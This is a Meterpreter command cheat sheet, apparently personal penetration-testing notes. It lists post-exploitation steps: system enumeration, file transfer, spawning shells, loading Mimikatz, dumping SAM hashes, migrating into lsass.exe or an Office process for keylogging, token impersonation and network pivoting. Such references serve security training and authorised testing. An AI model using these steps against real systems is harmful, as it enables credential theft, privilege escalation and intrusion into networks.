---
title: METERPRETER
summary: A Metasploit attack payload that provides an interactive shell.
description: A Metasploit attack payload that provides an interactive shell.
---

**[https://github.com/rapid7/meterpreter](https://github.com/rapid7/meterpreter)**

## Enumeration


 > 
 > **<font color=red>sysinfo</font>**</br>
 > Info about the system.

 > 
 > **<font color=red>getenv</font>**</br>
 > Get one or more environment variable values.

 > 
 > **<font color=red>getuid</font>**</br>
 > Get current user.
 > 
 > **<font color=red>getprivs</font>**</br>
 > Display current user privileges. 

 > 
 > **<font color=red>search -f</font>** flag.txt</br>
 > Search a file on the machine.

## File Transfer


 > 
 > **<font color=red>upload</font>**</br>
 > Upload a file or directory.

 > 
 > **<font color=red>download</font>**</br>
 > Download a file or directory.

## Spawn Shell


 > 
 > **<font color=red>shell</font>**</br>
 > Spawn a shell.

 > 
 > **<font color=red>load </font>**</br>
 > **<font color=red>powershell_shell</font>**</br>
 > Spawn Powershell.

## Spawn Mimikatz


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.


\>

 > 
 > **<font color=red>load kiwi</font>**</br>
 > Starts Mimikatz.
 > 
 > **<font color=red>help kiwi</font>**</br>
 > Show Mimikatz commands.

## Attacks


 > 
 > **<font color=red>hashdump</font>**</br>
 > Dump hashes from Windows SAM base (for linux use module  linux/gather/hashdump). 

 > 
 > **<font color=red>migrate</font>** 716</br>
 > Migrate to another process.</br>
 > Ex : Migrate to a word.exe and act like a keylogger.</br>
 > Ex: Migrate to lsass.exe to run hashdump.

## Impersonate

If the current user has **SeDebugPrivilege** and **SeImpersonatePrivilege** privileges enabled, we are able to impersonate another user.

 > 
 > **<font color=red>load incognito</font>**</br>
 > Load icognito module.
 > 
 > **<font color=red>list_tokens -u</font>**</br>
 > List Delegation Tokens available (not sure of the flag maybe `-g`).
 > 
 > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**</br>
 > Impersonate token.

To determine rights, Windows uses the Primary Token of the process and not the impersonated token. So we have to migrate to a process with correct permissions. 

The safest to pick is **services.exe**.

 > 
 > **<font color=red>migrate</font> 668**</br>
 > Migrate to process 668.

 > 
 > **<font color=red>rev2self</font>**</br>
 > Revert to previous user.

## Pivoting

When we have a meterpreter shell on a machine that has access to another network, we can use it to gain access to the 2nd network.

 > 
 > **<font color=red>run autoroute -s</font> \[REMOTE_NETWORK\]<font color=red>/24</font>**</br>
 > Create a route via the host that we had access to.

 > 
 > **<font color=red>run autoroute -p</font>**</br>
 > Show added routes.
